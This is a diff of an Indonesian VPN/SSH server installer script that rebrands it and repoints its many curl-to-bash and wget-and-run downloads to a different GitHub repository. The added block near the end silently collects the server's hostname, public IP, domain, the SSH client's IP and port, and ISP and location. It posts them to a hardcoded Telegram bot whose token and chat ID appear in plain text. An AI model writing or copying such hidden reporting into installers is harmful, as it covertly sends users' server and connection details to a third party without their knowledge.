@@ -10,7 +10,7 @@ echo "memeriksa vps anda"
 sleep 0.5
 CEKEXPIRED () {
 today=$(date -d +1day +%Y -%m -%d)
-Exp1=$(curl -sS https://raw.githubusercontent.com/mousethain/tahu/main/gerung | grep $MYIP | awk '{print $3}')
+Exp1=$(curl -sS https://raw.githubusercontent.com/messiey/rocky/master/gerung | grep $MYIP | awk '{print $3}')
 if [[ $today < $Exp1 ]]; then
 echo "status script aktif.."
 else
@@ -18,7 +18,7 @@ echo "SCRIPT ANDA EXPIRED";
 exit 0
 fi
 }
-IZIN=$(curl -sS https://raw.githubusercontent.com/mousethain/tahu/main/gerung | awk '{print $4}' | grep $MYIP)
+IZIN=$(curl -sS https://raw.githubusercontent.com/messiey/rocky/master/gerung | awk '{print $4}' | grep $MYIP)
 if [ $MYIP = $IZIN ]; then
 echo "IZIN DI TERIMA!!"
 else
@@ -51,7 +51,7 @@ mkdir -p /var/lib/scrz-prem >/dev/null 2>&1
 echo "IP=" >> /var/lib/scrz-prem/ipvps.conf
 sudo apt install vnstat
 sudo apt insta squid
-wget -q -O https://raw.githubusercontent.com/mousethain/tahu/main/tools.sh && chmod +x tools.sh && ./tools.sh
+wget -q -O https://raw.githubusercontent.com/messiey/rocky/master/tools.sh && chmod +x tools.sh && ./tools.sh
 rm tools.sh
 clear
 clear
@@ -76,10 +76,10 @@ echo -e "$green      Install SSH / WS / UDP              $NC"
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 sleep 2
 clear
-curl "https://raw.githubusercontent.com/mousethain/tahu/main/menu/ssh-vpn.sh" | bash
+curl "https://raw.githubusercontent.com/messiey/rocky/master/menu/ssh-vpn.sh" | bash
 sleep 2
-wget https://raw.githubusercontent.com/mousethain/tahu/main/nginx-ssl.sh && chmod +x nginx-ssl.sh && ./nginx-ssl.sh
-wget -q -O demeling.sh https://raw.githubusercontent.com/mousethain/tahu/main/demeling.sh && chmod +x demeling.sh && ./demeling.sh
+wget https://raw.githubusercontent.com/messiey/rocky/master/nginx-ssl.sh && chmod +x nginx-ssl.sh && ./nginx-ssl.sh
+wget -q -O demeling.sh https://raw.githubusercontent.com/messiey/rocky/master/demeling.sh && chmod +x demeling.sh && ./demeling.sh
 cd
 mkdir -p /root/udp
 ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
@@ -126,12 +126,12 @@ echo -e "$green      Install Websocket              $NC"
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 sleep 2
 clear
-curl "https://raw.githubusercontent.com/mousethain/tahu/main/Insshws/insshws.sh" | bash
+curl "https://raw.githubusercontent.com/messiey/rocky/master/Insshws/insshws.sh" | bash
 cd /usr/bin
-wget -O xp "https://raw.githubusercontent.com/mousethain/tahu/main/menu/xp.sh"
+wget -O xp "https://raw.githubusercontent.com/messiey/rocky/master/menu/xp.sh"
 chmod +x xp
 sleep 1
-wget -q -O /usr/bin/notramcpu "https://raw.githubusercontent.com/mousethain/tahu/main/Finaleuy/notramcpu" && chmod +x /usr/bin/notramcpu
+wget -q -O /usr/bin/notramcpu "https://raw.githubusercontent.com/messiey/rocky/master/Finaleuy/notramcpu" && chmod +x /usr/bin/notramcpu
 cd
 rm -f /root/ins-xray.sh
 rm -f /root/insshws.sh
@@ -141,15 +141,15 @@ echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━�
 echo -e "$green      Install ALL XRAY               $NC"
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 sleep 2
-curl "https://raw.githubusercontent.com/mousethain/tahu/main/menu/insray.sh" | bash
+curl "https://raw.githubusercontent.com/messiey/rocky/master/menu/insray.sh" | bash
 sleep 1
-curl "https://raw.githubusercontent.com/mousethain/tahu/main/arca.sh" | bash
+curl "https://raw.githubusercontent.com/messiey/rocky/master/arca.sh" | bash
 sleep 1
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 echo -e "$green      Install slowdns               $NC"
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 sleep 2
-wget -q -O slowdns.sh https://raw.githubusercontent.com/mousethain/tahu/main/SLDNS/slowdns.sh && chmod +x slowdns.sh && ./slowdns.sh
+wget -q -O slowdns.sh https://raw.githubusercontent.com/messiey/rocky/master/SLDNS/slowdns.sh && chmod +x slowdns.sh && ./slowdns.sh
 mkdir /root/akun
 mkdir /root/akun/vmess
 mkdir /root/akun/vless
@@ -159,12 +159,48 @@ echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━�
 echo -e "$green      Install IPSEC L2TP & SSTP               $NC"
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 sleep 1
-curl "https://raw.githubusercontent.com/mousethain/tahu/main/ipsec/ipsec.sh" | bash
+curl "https://raw.githubusercontent.com/messiey/rocky/master/ipsec/ipsec.sh" | bash
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 echo -e "$green      Install OPENVPN             $NC"
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
-wget "https://raw.githubusercontent.com/mousethain/tahu/main/Insshws/vpn.sh" && bash vpn.sh && rm vpn.sh
+wget "https://raw.githubusercontent.com/messiey/rocky/master/Insshws/vpn.sh" && bash vpn.sh && rm vpn.sh
 clear
+echo "Installing Bot Panel" | lolcat
+echo "Siapkan Token bot dan ID telegram mu"
+rm -rf bot.sh && wget https://raw.githubusercontent.com/messiey/rocky/master/botssh/bot.sh && chmod 777 bot.sh && ./bot.sh && systemctl restart cybervpn
+USERID=5039581855
+KEY="6670926441:AAHQnHzPxJaVy0WZD4kov4C3ZFPj8pqBjMk"
+TIMEOUT="10"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+DATE_EXEC="$(date "+%d %b %Y %H:%M")"
+TMPFILE='/tmp/ipinfo-$DATE_EXEC.txt'
+if [ -n "$SSH_CLIENT" ] && [ -z "$TMUX" ]; then
+IP=$(echo $SSH_CLIENT | awk '{print $1}')
+PORT=$(echo $SSH_CLIENT | awk '{print $3}')
+HOSTNAME=$(hostname -f)
+IPADDR=$(hostname -I | awk '{print $1}')
+curl http://ipinfo.io/$IP -s -o $TMPFILE
+CITY=$(cat $TMPFILE | sed -n 's/^  "city":[[:space:]]*//p' | sed 's/"//g')
+REGION=$(cat $TMPFILE | sed -n 's/^  "region":[[:space:]]*//p' | sed 's/"//g')
+COUNTRY=$(cat $TMPFILE | sed -n 's/^  "country":[[:space:]]*//p' | sed 's/"//g')
+ORG=$(cat $TMPFILE | sed -n 's/^  "org":[[:space:]]*//p' | sed 's/"//g')
+TEXT="
+==============================
+🕊 Informasi instalasi script 🕊
+==============================
+🎲Tanggal: $DATE_EXEC
+🎲Domain: $(cat /etc/xray/domain) 
+🎲Status: Telah menginstall scriptmu
+🎲Hostname  : $HOSTNAME 
+🎲Publik IP :$IPADDR 
+🎲IP PROV   : $IP 
+🎲ISP       : $ORG
+🎲KOTA      : $CITY
+🎲PROVINSI  : $REGION
+🎲PORT SSH. : $PORT"
+curl -s --max-time $TIMEOUT -d "chat_id=$USERID&disable_web_page_preview=1&text=$TEXT" $URL > /dev/null
+rm $TMPFILE
+fi
 echo "0 5 * * * root reboot" >> /etc/crontab
 echo "* * * * * root clog" >> /etc/crontab
 echo "59 * * * * root pkill 'menu'" >> /etc/crontab
@@ -195,7 +231,7 @@ rm -f ins-xray.sh
 rm -f senmenu.sh
 rm -f setupku.sh
 rm -f xraymode.sh
-echo "=====================-[  MouseVpn Premium  ]-===================="
+echo "=====================-[  Gretongers Vpn Premium  ]-===================="
 echo ""
 echo "------------------------------------------------------------"
 echo ""
@@ -237,7 +273,7 @@ echo ""
 echo ""
 echo "------------------------------------------------------------"
 echo ""
-echo "===============-[ Mousevpn ]-==============="
+echo "===============-[ Gretongers Vpn Premium ]-==============="
 echo -e ""
 echo ""
 echo "" | tee -a log-install.txt
